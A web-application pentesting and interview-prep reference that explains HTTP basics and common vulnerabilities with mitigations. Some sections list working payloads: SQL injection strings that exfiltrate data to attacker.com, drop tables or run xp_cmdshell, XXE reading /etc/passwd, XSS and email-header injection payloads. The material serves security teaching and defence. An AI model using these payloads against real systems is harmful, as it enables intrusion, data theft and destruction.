# Web Application Security - Reference & Interview Prep

A working reference for web-app pentesting and interviews. For every vulnerability the layout is the same so you can answer in a predictable shape: **What it is -> Why it happens -> How you test/exploit it -> Impact -> Mitigations**. Non-vulnerability topics (HTTP, headers, cookies, storage) are explained as concepts you should be fluent in before the vuln questions start.

JWT, OAuth and GraphQL live in [api-security.md](api-security.md); networking, TLS and crypto in [network-and-fundamentals.md](network-and-fundamentals.md); methodology, CVSS and reporting in [methodology-and-sdlc.md](methodology-and-sdlc.md).

---

# Part A - Pentest methodology

## How do you approach a web app pentest end to end?
1. **Scoping** - agree URLs, roles, test accounts, environment (UAT/prod), out-of-scope items, the testing window, black/grey/white box, and get written authorisation before you touch anything.
2. **Recon** - enumerate subdomains (subfinder, httpx), do content discovery (ffuf, dirsearch), fingerprint the tech stack, and read JavaScript files for hidden endpoints and secrets.
3. **Mapping** - browse every flow through Burp with each role so you build a complete sitemap, noting every parameter, object ID, file upload and redirect.
4. **Automated pass** - run Burp Scanner / ZAP / Nuclei for known CVEs and misconfigurations, but treat everything they report as a lead to verify, never as a finding.
5. **Manual testing** - work through the OWASP WSTG categories: authentication, session, access control, injection, and business logic (the part scanners cannot do).
6. **Exploit and validate** - confirm each issue, remove false positives, and demonstrate real impact with a working proof of concept.
7. **Report** - give each finding a severity and CVSS vector, reproduction steps, screenshots, business impact, and a concrete fix; add a non-technical executive summary.
8. **Retest** after remediation and close the item in the tracker.

## How do you decide severity and avoid false positives?
Re-test manually and prove impact with a working PoC before anything goes in the report. Severity is the CVSS base score adjusted for business context - the sensitivity of the data exposed, how exposed the endpoint is, and how hard the exploit is. A technically "medium" bug on highly sensitive data is often argued up.

## How do you chain low-severity bugs into something critical?
Impact comes from combinations. Self-XSS plus a CSRF on the vulnerable field becomes XSS against other users. An open redirect plus an OAuth flow becomes authorization-code/token theft. Information disclosure of user IDs plus an IDOR becomes mass data access. A missing rate limit plus a 4-6 digit OTP becomes account takeover.

---

# Part B - Web & HTTP platform fundamentals

## HTTP and HTTPS
HTTP (Hypertext Transfer Protocol) is the application-layer protocol used to transfer hypermedia such as HTML across the web. It uses a client-server model - the client sends a request and the server returns the resource - and runs over TCP/IP for reliable delivery. It is **stateless**: each request is independent and the server does not, by itself, remember previous ones (which is why sessions and cookies exist).

HTTPS is HTTP wrapped in SSL/TLS. It encrypts the traffic between browser and server so it stays confidential and tamper-evident in transit. Importantly, HTTPS only protects data *in transit* - it says nothing about application logic or data at rest, which is why a fully HTTPS site can still be SQL-injectable.

## HTTP versions and their security notes
- **HTTP/0.9 (1991, obsolete)** - GET only, no headers, no status codes, plaintext. No security controls at all.
- **HTTP/1.0 (1996)** - introduced headers, status codes and content types, and basic auth; but opened a new TCP connection per request and still sent everything in plaintext (eavesdropping/MITM, base64 basic-auth credentials, connection-flood DoS).
- **HTTP/1.1 (1997, still dominant)** - persistent (keep-alive) connections, sequential request pipelining, chunked transfer encoding, and caching (ETag, Cache-Control). Its header-parsing ambiguities are the root of request smuggling and response splitting; it is also exposed to cache attacks and Slowloris.
- **HTTP/2 (2015)** - binary framing, multiplexing many requests over one connection, and HPACK header compression. Brings new parsing bugs, HPACK side-channels (CRIME/BREACH family), and DoS via multiplexing abuse.
- **HTTP/3 (2022)** - runs over QUIC (UDP, encrypted by default with TLS 1.3), faster setup (0-RTT) and better on lossy networks. Watch 0-RTT replay and a new QUIC parsing attack surface.

## HTTP methods
A method states the client's intended action. **GET** retrieves data, with parameters in the URL query string (visible in history/logs, cacheable, limited by URL length). **POST** submits data in the request body (larger, not shown in the URL, not cached by default). **PUT** replaces or creates a resource from the body. **DELETE** removes a resource (ID usually in the URL). **HEAD** returns only headers (used to check metadata before downloading). **OPTIONS** reports allowed methods (and drives CORS preflight). **TRACE** is a diagnostic echo of the received request and should be disabled - if enabled it enables Cross-Site Tracing. Changing the method (e.g. GET -> POST, or using an overlooked PUT/DELETE/PATCH) is a common access-control and WAF bypass.

## HTTP headers
Headers carry metadata alongside the request/response body. They fall into groups:
- **General** (both directions): `Cache-Control`, `Connection`, `Date`.
- **Request**: `Host` (which site on a multi-host server), `User-Agent` (browser/OS), `Accept` (acceptable formats), `Authorization: Bearer <token>`, `Cookie`, `Referer` (page the request came from), `Content-Length`, `Accept-Encoding`.
- **Response**: `Server`, `Set-Cookie`, `Location` (redirect target), `Content-Type`, `Content-Encoding`, `Access-Control-Allow-Origin`.
- **Entity/representation** (describe the body): `Content-Type`, `Content-Length`, `Content-Encoding`, `Content-Disposition`.
- **Security headers** (see also the dedicated vuln sections): `Strict-Transport-Security` forces HTTPS and prevents downgrade MITM; `Content-Security-Policy` restricts script/resource sources to mitigate XSS; `X-Content-Type-Options: nosniff` stops MIME sniffing; `X-Frame-Options` / CSP `frame-ancestors` prevent clickjacking; `Referrer-Policy` limits referrer leakage; `Permissions-Policy` gates browser features (camera, mic, geolocation); COEP/CORP/COOP isolate cross-origin contexts. Legacy: `Pragma: no-cache` and `X-XSS-Protection` (prefer CSP).
- **Custom (`X-`) headers**, which are frequently abused: `X-Forwarded-For` / `X-Real-IP` (spoofable client IP -> bypass IP allowlists, rate limits, logging), `X-Forwarded-Host` (Host-header injection -> phishing, cache poisoning), `X-Forwarded-Proto` (SSL stripping if trusted blindly), `X-Original-URL` / `X-Rewrite-URL` (auth/routing bypass if trusted), `X-HTTP-Method-Override` (method-restriction bypass), and fingerprinting leaks like `X-Powered-By`, `Server`, `X-AspNet-Version`.

## HTTP message body (payload)
The body is the actual data carried in a request (usually with POST/PUT/PATCH) or a response (HTML, JSON, images, files). It is where most injection happens, so it must be validated and sanitised, sent only over HTTPS, size-limited to prevent DoS, and tagged with a correct `Content-Type` (e.g. `application/json`, not `text/plain`). Sensitive fields (tokens, credentials) should never be sent in plaintext or left unencrypted in a body.

## Cookies
A cookie is a small (~4 KB) key-value pair the server sets with `Set-Cookie` and the browser then sends automatically on every request to that domain. They can be session-based (cleared on browser close) or persistent (until an expiry). They are used for session management, auth tokens, tracking and personalisation. The security-relevant attributes are:
- **HttpOnly** - JavaScript cannot read the cookie, which blunts XSS-based theft.
- **Secure** - the cookie is only sent over HTTPS, so it is not exposed on plaintext channels.
- **SameSite** - controls cross-site sending: `Strict` (never sent cross-site), `Lax` (sent on top-level navigation only, the safer default), `None; Secure` (allows third-party cookies but only over HTTPS). This is a core CSRF defence.
- **Domain/Path** scope and **Expires/Max-Age** lifetime.

Scope matters: a cookie set on `example.com` is readable by the domain and all subdomains (`app.example.com`, `shop.example.com`), whereas one set on `app.example.com` is not visible to the parent or sibling subdomains. Misconfigurations - sensitive data stored unencrypted, missing HttpOnly (XSS theft), missing Secure (plaintext exposure), weak SameSite (CSRF) - are common findings.

## Client-side and server-side storage
Browser storage options differ in lifetime, scope and size, which matters because anything readable by JavaScript is stealable via XSS:
- **Cookies** - ~4 KB, sent with every request, used for sessions/auth/tracking.
- **localStorage** - ~5-10 MB, persistent, domain-scoped, JS-accessible (so a poor place for tokens).
- **sessionStorage** - ~5-10 MB, cleared when the tab closes, tab-scoped.
- **IndexedDB** - large structured NoSQL store for offline apps.
- **Cache Storage** (Service Workers) - stores HTTP responses for offline/PWA use.
- **Web SQL** - deprecated, avoid.
- **In-memory (JS variables)** - transient, cleared on refresh.

Server-side, state lives in databases (MySQL, MongoDB), file systems, and session stores (Redis). Application state management sits on top (React/Redux/Vuex on the frontend; session tracking, auth and caching on the backend).

## WebSockets
A WebSocket is a full-duplex, persistent channel over a single TCP connection between browser and server. It starts as an HTTP request that is upgraded with the `Upgrade` header, so it reuses existing HTTP/proxy infrastructure, then stays open for low-latency bidirectional messaging (chat, gaming, live collaboration). Because WebSockets carry real actions and sensitive data, essentially any vulnerability that affects normal HTTP - injection, access control, CSRF-style cross-site WebSocket hijacking - can affect them too, so test the messages the same way you test HTTP requests.

---

# Part C - Vulnerabilities

The taxonomy below follows the usual grouping: injection, cross-site/client-side, access control, request forgery and cross-origin, authentication and session, file and path handling, HTTP-layer desync/caching, and abuse/limits.

## Injection

### SQL Injection (SQLi)
**What it is.** SQL injection is a vulnerability where an attacker injects SQL into input that the application concatenates into a database query. Because most apps talk to a database in SQL, altering the query lets the attacker read, modify or delete data the query was never meant to expose.

**Why it happens.** User input is placed directly into a dynamically built query string with no parameterisation - a combination of missing input validation, manual string-concatenated SQL, improper use of DB APIs/ORMs, and developers not following secure-coding practice.

**How you test and exploit it.** Test every entry point - URL parameters, POST data, HTTP headers (`User-Agent`, `Referer`, `Cookie`, `X-Forwarded-For`), and JSON/XML fields.
- *Initial detection:* submit a single quote `'` and watch for DB errors or anomalies; compare a true vs false condition (`AND 1=1` vs `AND 1=2`, or `OR 1=1` vs `OR 1=2`); submit a time-delay payload (`SLEEP(5)` / `WAITFOR DELAY`); submit an out-of-band (OAST) payload that triggers a DNS/HTTP callback.
- *Classify the type by the response:* data in errors -> error-based; visible `UNION SELECT` output -> union-based; page changes on true/false with no data -> boolean-blind; response time changes with `SLEEP()` -> time-blind; DNS/HTTP callback -> out-of-band.
- *Types in full:* **in-band** (error-based and union-based, where results come straight back), **blind** (boolean-based and time-based, inferred from behaviour), **out-of-band** (exfiltration over DNS/HTTP when no direct channel exists), and **second-order** (payload stored during one action - e.g. registering the username `admin'-- -` - then executed later when another query uses it).
- *Fingerprint the DB:* `VERSION()`/`@@version` (MySQL), `@@VERSION` (MSSQL), `version()` (PostgreSQL), `SELECT banner FROM v$version` (Oracle).
- *Union workflow:* find the column count with `' ORDER BY 1-- -` ... increasing until it errors (or `UNION SELECT NULL,NULL,...`); find which columns are string-typed and displayed by placing `'a'` in each in turn; then enumerate the schema via `information_schema` and extract data.

**Representative payloads (keep, by type).**
- *Error-based:* `' AND extractvalue(1,concat(0x7e,database()))-- -` (MySQL), `' AND updatexml(1,concat(0x7e,version()),1)-- -` (MySQL), `' AND 1=convert(int,@@version)-- -` (MSSQL), `' AND 1=cast(version() as int)-- -` (PostgreSQL), `' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))-- -` (Oracle).
- *Union-based:* `' ORDER BY N-- -`; `' UNION SELECT NULL,NULL,NULL-- -`; `' UNION SELECT 1,2,database()-- -`; `' UNION SELECT 1,2,table_name FROM information_schema.tables-- -`; `' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- -`; `' UNION SELECT username, password FROM users-- -`; `' UNION SELECT username || '~' || password FROM users-- -`.
- *Boolean-blind:* `' AND 1=1-- -` vs `' AND 1=2-- -`; `' AND SUBSTRING(database(),1,1)='a'-- -`; `' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1-- -`.
- *Time-blind:* `' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -` (MySQL); `'; IF (SELECT SUBSTRING(db_name(),1,1))='a' WAITFOR DELAY '0:0:5'-- -` (MSSQL); `' AND CASE WHEN SUBSTRING(current_database(),1,1)='a' THEN pg_sleep(5) ELSE 0 END-- -` (PostgreSQL); `' AND (SELECT dbms_pipe.receive_message('x',5) FROM dual) IS NULL-- -` (Oracle).
- *Error-based blind (conditional):* `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` (division-by-zero on true); extract via `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -`.
- *Out-of-band:* `' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\x'))-- -` (MySQL); `'; DECLARE @h varchar(8000); SET @h='\\attacker.com\share\'+db_name()+'.txt'; EXEC master..xp_dirtree @h-- -` (MSSQL); `' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1-- -` (Oracle).
- *Stacked queries:* `'; DROP TABLE users-- -`; `'; SELECT * FROM users INTO OUTFILE '/tmp/out.txt'-- -`; `'; EXEC xp_cmdshell 'dir'-- -` (MSSQL).
- *WAF-bypass / encoding:* URL and double-URL encoding, case variation (`' aNd 1=1-- -`), inline comments (`'/**/AND/**/1=1-- -`, `'/*!50000AND*/ 1=1-- -`), hex encoding, and string concatenation (`' AND 'a'='a'`).

Injection can live in the `WHERE` clause (most common), in `UPDATE`/`INSERT` values, in table/column names (rare, needs whitelist bypass) and in `ORDER BY` (e.g. `?sort=price'`). Confirm manually first, then use **sqlmap** to enumerate/dump where permitted: `sqlmap -u "...?id=1" --dbs`, `... -D db --tables`, `... -D db -T users --columns`, `... --dump`, `--level`/`--risk` to go deeper, `--os-shell` for OS command execution. In severe cases SQLi leads to authentication bypass, full database extraction, or RCE/server compromise (e.g. MSSQL `xp_cmdshell`, MySQL `INTO OUTFILE` writing a webshell).

**Mitigations.** The primary defence is **parameterised queries / prepared statements**, which send the query structure to the database first (with placeholders) and the values separately, so input is always treated as data and can never change the query logic - even `' OR '1'='1` is just a string. Use an ORM's safe APIs (which parameterise under the hood), whitelist any dynamic identifiers like table/column names (these cannot be parameterised), apply least-privilege DB accounts (no DBA account for the app, no `DROP`), disable detailed DB errors in production, and keep a WAF only as defence-in-depth. Note that escaping (`mysqli_real_escape_string`) is **not** equivalent to parameterisation and does not protect non-value positions; stored procedures are still vulnerable if they build dynamic SQL by concatenation.

### NoSQL Injection
**What it is.** NoSQL databases are non-relational stores (key-value like Redis/DynamoDB, document like MongoDB/CouchDB, column like Cassandra/HBase, graph like Neo4j) that are schema-less, horizontally scalable and often queried with JSON/operator syntax rather than SQL. NoSQL injection abuses that query/operator syntax when user input is passed unsanitised into a query.

**Why it happens.** The app embeds user-controlled values directly into a NoSQL query or object, so an attacker can inject operators (e.g. MongoDB `$ne`, `$gt`, `$where`) that change the query's meaning - for instance submitting `{"username":{"$ne":null},"password":{"$ne":null}}` to bypass a login that expected plain strings.

**How you test and exploit it.** Where a value is expected, try injecting a query operator object instead of a scalar, and test both the data and the operator positions. Authentication bypass via `$ne`/`$gt`, data extraction via boolean/time behaviour, and JavaScript execution via `$where` are the usual avenues.

**Impact.** Authentication bypass, unauthorised data read/modify, and in some engines server-side JavaScript execution.

**Mitigations.** Validate and cast input to the expected type (a password must be a string, not an object), use the driver's safe query builders rather than passing raw request objects, disable server-side JavaScript evaluation (`$where`, `mapReduce`) where possible, and apply least privilege.

### OS Command Injection
**What it is.** Also called shell injection: the application passes user input into an operating-system command, letting the attacker run arbitrary OS commands on the server. This often leads to full compromise and a pivot point into the rest of the infrastructure.

**Why it happens.** Application code builds a shell command string that includes user input, so shell metacharacters in that input are interpreted as command syntax rather than data.

**How you test and exploit it.** Inject shell metacharacters that chain commands. Separators that work on Windows and Unix: `&`, `&&`, `|`, `||`. Unix-only: `;` and a newline (`\n`/`0x0A`). Inline execution on Unix: backticks `` `cmd` `` and `$(cmd)`. Useful proof commands: `whoami`, `uname -a`/`ver`, `ifconfig`/`ipconfig /all`, `netstat -an`, `ps -ef`/`tasklist`. For blind cases, trigger a measurable time delay (`&& ping -c 5 127.0.0.1`) or an out-of-band DNS lookup.

**Impact.** Arbitrary command execution, data theft, full server compromise, lateral movement via trust relationships.

**Mitigations.** The most effective fix is to **not call the OS shell from application code at all** - use safe, platform-specific APIs instead. If a command call is unavoidable, pass arguments as an array (no shell interpolation) and apply strict input validation (whitelist allowed values, enforce numeric/alphanumeric-only). Never rely on escaping metacharacters; it is error-prone and bypassable.

### CRLF Injection
**What it is.** CRLF injection inserts Carriage Return (`\r`, `%0D`) and Line Feed (`\n`, `%0A`) characters - the line terminators of HTTP headers - into input that ends up in headers or responses, letting the attacker add or split headers.

**Why it happens.** User input is written into an HTTP header (e.g. `Set-Cookie`, `Location`) or the response without stripping CR/LF, so injected line breaks create new header lines.

**How you test and exploit it.** Inject `%0D%0A` followed by a header, e.g. turning `Location: /welcome?user=Alice` into `user=Alice%0D%0ASet-Cookie:session=malicious`. This enables HTTP response splitting (crafting a fake response), web cache poisoning, reflected XSS via injected headers, and session fixation via injected `Set-Cookie`.

**Impact.** Response splitting, cache poisoning, XSS, and cookie setting/overwriting (session hijacking/fixation).

**Mitigations.** Strip or reject CR/LF in any input used in headers or responses, avoid putting user input in headers directly, use framework APIs that encode headers safely, and validate input to a safe character set.

### Null Byte Injection
**What it is.** Injecting a null byte (`\0`, `%00`) into input to abuse languages/functions that treat the null byte as a string terminator (classically C/C++ and older PHP), truncating a string earlier than the application expects.

**Why it happens.** The application validates one view of a string (e.g. "ends in `.jpg`") but a lower-level function stops reading at the null byte, so the two disagree.

**How you test and exploit it.** Supply a payload like `malicious.php%00.jpg` to a filter that only checks for `.jpg`; the check sees `.jpg`, but the file is handled as `malicious.php`. Also useful against path checks to reach files outside an expected extension.

**Impact.** Bypassing file-upload or input validation, reading/overwriting unexpected files, and potential RCE when chained with an upload or inclusion.

**Mitigations.** Reject or strip null bytes from all input, use modern string-handling functions that are not null-terminated, validate file types/paths explicitly on the server, and apply strict allow-listing.

### XML External Entity (XXE) Injection
**What it is.** XML is a self-describing, hierarchical, text-based markup used in SOAP, config files, Office documents (`.docx`/`.xlsx`/`.pptx`), RSS/Atom and data exchange. XXE is an attack against an XML parser that resolves external entities: a crafted XML document defines an entity pointing at a local file or URL, and the parser fetches it.

**Why it happens.** The XML parser has DTD processing and external-entity resolution enabled (often the default), so attacker-supplied XML can declare and dereference entities.

**How you test and exploit it.** Submit XML to any endpoint that parses it (SOAP, file upload, SVG, SAML) containing a DOCTYPE with an external entity, e.g. `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` then reference `&xxe;`, and observe the file contents in the response. Blind/out-of-band XXE uses an external DTD to exfiltrate data over DNS/HTTP; an entity pointing at an internal URL turns XXE into SSRF; nested entities cause a billion-laughs DoS.

**Impact.** Local file read, SSRF, and denial of service.

**Mitigations.** Disable DTD processing and external-entity resolution in the parser configuration (library-specific hardening flags), prefer JSON where feasible, and validate/allow-list XML against a schema.

### Insecure Deserialization
**What it is.** Serialization turns an in-memory object into a storable/transmittable form (JSON, XML, binary); deserialization reconstructs it. Insecure deserialization is reconstructing data from an untrusted source without validating it, which can let an attacker influence the resulting object - or, with the right "gadget" classes present, execute code during deserialization.

**Why it happens.** The application deserializes attacker-controllable data (request bodies, cookies, hidden fields) with a native deserializer that will instantiate arbitrary classes and invoke their methods, with no integrity check on the byte stream.

**How you test and exploit it.** Look for serialized blobs - Java `rO0AB...`, PHP `O:4:"User":...`, .NET ViewState, Python pickle. Tamper with fields (e.g. flip `role` to `admin`) for logic/privilege abuse, or build a known gadget chain (e.g. with `ysoserial`) and submit it where the app calls `ObjectInputStream.readObject()` / `unserialize()` / `pickle.loads()` to achieve RCE.

**Impact.** Remote code execution in the worst case, plus access-control bypass, privilege escalation and data tampering.

**Mitigations.** Do not deserialize untrusted data; if you must, use a safe data format (JSON) rather than native object serialization, enforce strict type checks, allow-list the classes permitted to deserialize, add integrity checks (digital signatures) to serialized data, and keep deserialization libraries patched.

### Server-Side Template Injection (SSTI)
**What it is.** User input is embedded into a server-side template that is then evaluated by the template engine, so the input is executed as template code rather than printed as data.

**Why it happens.** The application concatenates user input into a template string (e.g. building an email or page from user-controlled content) instead of passing it as a bound variable.

**How you test and exploit it.** Inject a simple arithmetic expression such as `{{7*7}}` or `${7*7}`; if the response contains `49`, the engine is evaluating input. Then fingerprint the engine (Jinja2, Twig, Freemarker) and use engine-specific payloads to read files or reach RCE.

**Impact.** Information disclosure, file read, and frequently full remote code execution.

**Mitigations.** Never pass user input into a template as code - pass it as context data to a logic-less/sandboxed template, and validate/escape where interpolation is unavoidable.

### LDAP Injection
**What it is.** LDAP (Lightweight Directory Access Protocol) queries directory services such as Active Directory and OpenLDAP for authentication and user/resource lookups. LDAP injection manipulates input that is concatenated into an LDAP search filter, altering the filter's logic - the directory-services analogue of SQLi.

**Why it happens.** User input is placed directly into an LDAP filter string (e.g. `(uid=<input>)`) without escaping the LDAP special characters `( ) & | * = \` and the null byte.

**How you test and exploit it.** Inject filter metacharacters and watch for an auth bypass or altered results. Supplying `*` as a username matches any entry; a crafted value can close the intended filter and inject an always-true clause, e.g. `*)(uid=*))(|(uid=*` turning `(uid=admin)` into a tautology. Use `)(|(...))` to OR in extra conditions and `*` as a wildcard to enumerate attributes and values blind (character by character) from the response differences.

**Impact.** Authentication bypass, unauthorised reading/enumeration of directory data, and sometimes modification of directory entries.

**Mitigations.** Escape all LDAP special characters per RFC 4515, use parameterised/framework LDAP APIs that bind input safely, validate input against an allow-list, and run the bind account with least privilege.

### XML Injection
**What it is.** Inserting XML metacharacters or tags into input that the application embeds into an XML document or message (a SOAP body, a config file, an XML-based API), so the attacker changes the document's structure rather than just its data.

**Why it happens.** User input is written into XML without encoding `<`, `>`, `&` and quotes, so injected tags are parsed as markup. It frequently sits next to XXE and XPath injection.

**How you test and exploit it.** Submit XML metacharacters and watch for parser errors or structural change, then inject tags to add or override elements - for example injecting `</price><price>0</price>` to tamper with an order total, or closing and reopening elements to add a privileged flag (tag injection). From there it chains into XXE (external entities) and into overwriting trust-bearing fields.

**Impact.** Data and logic tampering (prices, roles, quantities), validation bypass, and escalation to XXE.

**Mitigations.** Encode user data placed into XML, build XML with safe serialisers instead of string concatenation, validate against a strict schema (XSD), and disable external-entity/DTD processing.

### XPath Injection
**What it is.** XPath is a query language for selecting nodes from an XML document; applications that authenticate or look data up against an XML store build XPath queries. XPath injection manipulates input concatenated into an XPath expression.

**Why it happens.** Input is placed directly into an XPath query - e.g. `//user[name/text()='<input>' and password/text()='<input>']` - without sanitisation.

**How you test and exploit it.** Inject XPath syntax exactly as with SQLi: `' or '1'='1` creates a tautology that bypasses an XML-backed login, and `or 1=1` returns all nodes. Blind XPath injection extracts the whole document character by character with `substring()` and `string-length()` true/false tests - and because XPath has no comments and no row-level access control, the entire document (often every user and credential) is reachable.

**Impact.** Authentication bypass and full extraction of the backing XML document.

**Mitigations.** Use parameterised XPath (precompiled expressions with variable binding), escape and validate input, and prefer a database with proper access control over an XML credential store.

### Expression Language (EL) Injection
**What it is.** EL injection occurs when user input is evaluated by a server-side Expression Language engine - Java EL/SpEL in Spring and JSF, OGNL in Struts - letting the attacker run expressions that reach Java objects and methods. It is closely related to SSTI.

**Why it happens.** Input is passed into an expression the framework then evaluates, such as a SpEL expression built from a request parameter or an OGNL expression in a Struts parameter name.

**How you test and exploit it.** Submit a probe like `${7*7}`, `#{7*7}` or `%{7*7}` and look for `49` in the response. Then escalate with engine-specific payloads that reach the runtime - e.g. OGNL/SpEL invoking `java.lang.Runtime` to execute commands, the class of bug behind the Struts `Content-Type` RCE (CVE-2017-5638).

**Impact.** Information disclosure, authentication/logic bypass, and frequently remote code execution.

**Mitigations.** Never evaluate user input as an expression, keep request data out of EL contexts, patch Struts/Spring promptly, and sandbox/allow-list evaluation if dynamic expressions are genuinely required.

### SMTP / Email Header Injection
**What it is.** SMTP injection inserts CRLF sequences and extra email headers into input used to build a message (contact and feedback forms, "invite a friend", password-reset senders), letting the attacker add recipients or headers or craft arbitrary mail through the application's mail server.

**Why it happens.** User-controlled values (subject, from, body) are placed into the email without stripping CR/LF, so injected line breaks create new headers - the email analogue of CRLF/HTTP response splitting.

**How you test and exploit it.** Inject `%0d%0a` followed by headers into a form field, for example adding `Bcc: attacker@evil.com`, extra `To:` recipients, or a second MIME body part. A "name" field that lands in a header can smuggle additional recipients or a `Content-Type`, turning the contact form into an open relay for spam and phishing sent from the trusted domain.

**Impact.** Spam/phishing from the trusted domain, information disclosure, and mail-server abuse (reputation damage, blacklisting).

**Mitigations.** Strip or reject CR/LF and header-like content from all email fields, use a mail library that builds headers safely (parameterised recipients/subject), validate addresses, and never pass raw user input into SMTP headers.

## Cross-site & client-side

### Cross-Site Scripting (XSS)
**What it is.** XSS lets an attacker inject script (usually JavaScript) that runs in another user's browser in the vulnerable site's origin. From there it can steal cookies and session tokens, hijack sessions, deface pages, redirect to malicious sites, keylog, or perform actions as the victim.

**Why it happens.** The application takes untrusted input - form fields, URL parameters, comments - and renders it into a page without context-appropriate encoding or sanitisation, so the browser treats it as active content.

**How you test and exploit it.** There are three types, tested differently:
- **Reflected** - the payload is in the request and echoed straight back in the response (often in search results or error messages); it needs the victim to open a crafted URL. Test every entry point (URL params, POST body, headers like `User-Agent`/`Referer`, cookies) by submitting a unique marker, finding where and in what context it reflects, then breaking out of that context.
- **Stored (persistent)** - the payload is saved server-side (comment, profile, filename) and runs for every viewer, so it is usually higher severity.
- **DOM-based** - client-side JavaScript takes data from a source like `location.hash`, `document.URL`, `document.referrer` or `window.name` and passes it to a sink like `innerHTML`, `eval()` or `document.write()`, so the server may never see the payload; trace source -> sink in the JS.

Context decides the payload: in HTML body `<img src=x onerror=alert(1)>` or `<svg onload=alert(1)>`; inside an attribute break out with `" onmouseover=alert(1) x="`; inside a JS string `';alert(1)//`; in a URL/`href` use `javascript:alert(1)`. Other useful payloads: `<script>alert(1)</script>`, `<svg><animatetransform onbegin=alert(1)></svg>`, framework-sandbox escapes such as AngularJS `{{constructor.constructor('alert(1)')()}}`, and URL-encoded forms (`%3Cimg%20src=x%20onerror=prompt(1)%3E`) to slip past filters. Burp Intruder is handy for fuzzing which tags/events are allowed.

**Impact.** Session/cookie theft and account takeover, actions performed as the victim, CSRF-token theft, keylogging, and phishing redirects.

**Mitigations.** Encode output based on context (HTML, attribute, JavaScript, URL, CSS). Deploy a strong Content-Security-Policy with a `script-src` allow-list as a last line of defence. Set `HttpOnly` and `Secure` on cookies so script cannot read them. Prefer safe DOM APIs (`textContent`) over `innerHTML`, avoid `eval`/`Function`/string `setTimeout`/`document.write`, and sanitise with DOMPurify when HTML is genuinely needed. Validate input on arrival and use frameworks (React, Angular) that auto-escape. Use `Content-Type` and `X-Content-Type-Options: nosniff` so non-HTML responses are not interpreted as HTML.

### Clickjacking (UI redressing)
**What it is.** The attacker tricks a user into clicking something different from what they perceive, by overlaying the target site invisibly over a decoy page - so a click on a visible "Play"/"Claim prize" button actually lands on a hidden action like "Transfer funds".

**Why it happens.** The target page can be loaded in an `<iframe>` because it lacks `X-Frame-Options` or CSP `frame-ancestors`, its UI elements can be repositioned/hidden with CSS/JS, and the victim has an active logged-in session so framed actions run as them.

**How you test and exploit it.** Try to load the target in an iframe on your own page; if it renders and sensitive one-click actions are reachable, make the iframe transparent (`opacity:0`) and position it over an enticing decoy button, e.g. `<iframe src="https://bank/transfer" style="opacity:0;position:absolute;top:0;left:0"></iframe>` beneath a "Click to claim" button.

**Impact.** Unauthorised actions performed by the victim (settings changes, likes, fund transfers), and account compromise when combined with CSRF.

**Mitigations.** Send `X-Frame-Options: DENY` or `SAMEORIGIN`, or better CSP `frame-ancestors 'self'`. Add confirmation steps or CAPTCHAs for sensitive actions. Frame-busting scripts are unreliable and should not be the only control. It only matters on pages with sensitive one-click actions.

### Prototype Pollution
**What it is.** A JavaScript-specific vulnerability where an attacker injects properties into `Object.prototype` - the base object every JS object inherits from - so the polluted property then appears on *all* objects application-wide. It affects both client-side JavaScript and server-side Node.js.

**Why it happens.** Code recursively merges, clones or sets attacker-controlled data (usually JSON) into an object without blocking the special keys `__proto__`, `constructor` and `prototype` - common in hand-rolled merge/extend/set utilities and loose query-string parsers.

**How you test and exploit it.** Send a payload whose key path targets the prototype - `{"__proto__":{"isAdmin":true}}` to a JSON merge endpoint, or `?__proto__[isAdmin]=true` through a vulnerable query parser - then check whether a brand-new, unrelated object now has `isAdmin`. Impact depends on available "gadgets": a polluted property can flip an authorization flag, change application behaviour, cause DoS, create client-side XSS (polluting a sink a library trusts) or, in Node with the right gadget (e.g. options passed to `child_process`), reach RCE.

**Impact.** Privilege escalation, denial of service, client-side XSS, and server-side RCE via gadget chains.

**Mitigations.** Reject or strip `__proto__`/`constructor`/`prototype` keys on input; use `Map` instead of plain objects for user-keyed data; create objects with `Object.create(null)` (no prototype); freeze `Object.prototype` where feasible; and rely on safe, maintained merge libraries.

## Access control

### Broken Access Control (BAC), IDOR & privilege escalation
**What it is.** Broken access control is the failure to enforce what an authenticated user is allowed to do, letting them reach other users' data or admin functionality. Access control has three parts: authentication (who you are), session management (which requests are yours), and authorization (whether you may do this action). IDOR is the specific case where an object reference is used without an ownership check.

**Why it happens.** Permission checks are missing, enforced only on the client, or trust client-supplied identifiers/roles instead of deriving entitlements server-side. Three control types get broken: **vertical** (role-based, e.g. only admins delete users), **horizontal** (user-owned data, e.g. you see only your account), and **context-dependent** (state-based, e.g. can't edit a cart after checkout).

**How you test and exploit it.** Use the common bypass techniques: forced browsing to hidden endpoints (`/admin`, `/config`); parameter tampering (change `role=user` to `role=admin`, or hidden fields/cookies); IDOR by editing sequential/predictable IDs (`userId=1 -> 2`, `order_id=1001 -> 1002`) or brute-forcing them; using leaked identifiers from JS/errors/logs; skipping workflow steps (hitting payment-confirmation directly); HTTP verb tampering (GET <-> POST); header manipulation (`X-Original-URL`, `X-Forwarded-For`, `X-HTTP-Method-Override`); User-Agent/Referer spoofing against weak checks; and bypassing client-side-only validation with Burp. For IDOR specifically, use two accounts of the same role (A and B): capture A's request referencing an object ID, swap in B's ID while keeping A's session, and see if B's data returns or changes. Automate with Burp Autorize. Privilege escalation is **vertical** (user -> admin, e.g. exploiting a flawed role check to reach an admin dashboard) or **horizontal** (reaching another user's data by changing `user_id`).

**Impact.** Reading or modifying other users' data, performing administrative actions, and - if an admin account is reached - full application compromise.

**Mitigations.** Deny by default and grant access explicitly. Enforce every check server-side; never trust hidden fields or JS. Use RBAC (and ABAC for complex cases) through centralised middleware/decorators rather than scattered checks. Do object-level ownership checks on every access (`if current_user.id != resource.owner_id: 403`). Avoid exposing sensitive actions in guessable URLs. Log access-control violations, alert on patterns (normal users probing admin routes), and test access control explicitly with role-switching and unauthorised-request fuzzing.

## Request forgery & cross-origin

### Cross-Site Request Forgery (CSRF)
